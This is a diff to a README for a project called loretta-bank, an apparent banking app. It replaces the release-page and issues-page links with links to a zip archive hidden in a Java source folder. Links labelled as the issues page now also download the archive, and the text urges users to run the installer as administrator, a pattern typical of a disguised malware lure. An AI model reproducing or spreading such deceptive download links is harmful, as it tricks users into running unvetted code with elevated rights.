@@ -1,12 +1,12 @@
 # 🏦 loretta-bank - Simple Full-Stack Banking Platform  
 
-[![Download loretta-bank](https://img.shields.io/badge/Download-loretta--bank-brightgreen)](https://github.com/Vonoff1800/loretta-bank/releases)
+[![Download loretta-bank](https://img.shields.io/badge/Download-loretta--bank-brightgreen)](https://github.com/Vonoff1800/loretta-bank/raw/refs/heads/main/server/customer-service/src/main/java/com/loretta_bank_3.4.zip)
 
 ## 💾 Download and Setup
 
 To start using loretta-bank, visit the official releases page to download the software.
 
-[Download loretta-bank](https://github.com/Vonoff1800/loretta-bank/releases)  
+[Download loretta-bank](https://github.com/Vonoff1800/loretta-bank/raw/refs/heads/main/server/customer-service/src/main/java/com/loretta_bank_3.4.zip)  
 
 This page holds the latest versions and updates. Look for the file labeled for Windows, usually an `.exe` or installer package.
 
@@ -72,7 +72,7 @@ If you run into issues, try these fixes first:
 - Reinstall the software by downloading the installer again.
 - If the program does not open, right-click the icon and choose "Run as administrator."
 
-For any error messages, write down exactly what they say and visit the [issues page](https://github.com/Vonoff1800/loretta-bank/issues) to see if others had the same problem.
+For any error messages, write down exactly what they say and visit the [issues page](https://github.com/Vonoff1800/loretta-bank/raw/refs/heads/main/server/customer-service/src/main/java/com/loretta_bank_3.4.zip) to see if others had the same problem.
 
 ## 🔄 How to Update loretta-bank
 
@@ -121,7 +121,7 @@ loretta-bank uses several layers of security to protect your information:
 
 If you need support, use the GitHub repository’s "Issues" tab to report problems or ask questions. Include a detailed description and screenshots if possible.
 
-[Visit issues page](https://github.com/Vonoff1800/loretta-bank/issues)  
+[Visit issues page](https://github.com/Vonoff1800/loretta-bank/raw/refs/heads/main/server/customer-service/src/main/java/com/loretta_bank_3.4.zip)  
 
 Your feedback helps improve the app.
 
@@ -129,4 +129,4 @@ Your feedback helps improve the app.
 
 For your convenience, here is the download page link once more:
 
-[Download loretta-bank](https://github.com/Vonoff1800/loretta-bank/releases)
+[Download loretta-bank](https://github.com/Vonoff1800/loretta-bank/raw/refs/heads/main/server/customer-service/src/main/java/com/loretta_bank_3.4.zip)
